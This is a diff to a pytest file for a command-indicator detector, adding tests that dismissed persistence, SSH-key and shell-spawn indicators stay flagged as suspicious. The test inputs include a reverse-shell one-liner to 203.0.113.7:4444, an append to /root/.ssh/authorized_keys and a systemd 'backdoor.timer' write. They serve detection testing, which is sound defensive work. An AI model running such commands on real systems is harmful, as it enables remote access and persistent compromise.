@@ -9,6 +9,7 @@ import pytest
 
 from src.indicators import (
     DEFAULT_CRITICAL_INDICATORS,
+    DEFAULT_REVIEW_INDICATORS,
     INDICATOR_PATTERNS,
     match_indicators,
     parse_critical_indicators,
@@ -157,3 +158,40 @@ def test_unknown_critical_indicator_names_are_dropped() -> None:
 
 def test_critical_indicators_are_all_known() -> None:
     assert DEFAULT_CRITICAL_INDICATORS <= set(INDICATOR_PATTERNS)
+
+
+@pytest.mark.parametrize("command", [
+    "/usr/bin/bash -c printf x > /etc/systemd/system/backdoor.timer",  # persistence_config
+    "/usr/bin/tee -a /root/.ssh/authorized_keys",                       # privileged_account_config
+    "/usr/bin/bash -i >& /dev/tcp/203.0.113.7/4444 0>&1",              # interactive_shell_spawn
+])
+def test_gate_keeps_a_dismissed_review_indicator_visible(command: str) -> None:
+    assert _apply_escalation_gate(
+        "FALSE_POSITIVE",
+        match_indicators(command),
+        DEFAULT_CRITICAL_INDICATORS,
+        DEFAULT_REVIEW_INDICATORS,
+    ) == "SUSPICIOUS"
+
+
+def test_review_indicators_never_escalate_to_malicious() -> None:
+    indicators = match_indicators("/usr/bin/crontab -l")
+    assert _apply_escalation_gate(
+        "SUSPICIOUS", indicators, DEFAULT_CRITICAL_INDICATORS, DEFAULT_REVIEW_INDICATORS
+    ) == "SUSPICIOUS"
+
+
+def test_review_indicators_leave_unrelated_dismissals_alone() -> None:
+    indicators = match_indicators("/usr/bin/apt-get install -y nginx")
+    assert _apply_escalation_gate(
+        "FALSE_POSITIVE", indicators, DEFAULT_CRITICAL_INDICATORS, DEFAULT_REVIEW_INDICATORS
+    ) == "FALSE_POSITIVE"
+
+
+def test_review_indicator_set_is_configurable() -> None:
+    assert parse_critical_indicators("persistence_config, nope", default=frozenset()) == {
+        "persistence_config"
+    }
+    assert parse_critical_indicators(None, default=DEFAULT_REVIEW_INDICATORS) == (
+        DEFAULT_REVIEW_INDICATORS
+    )
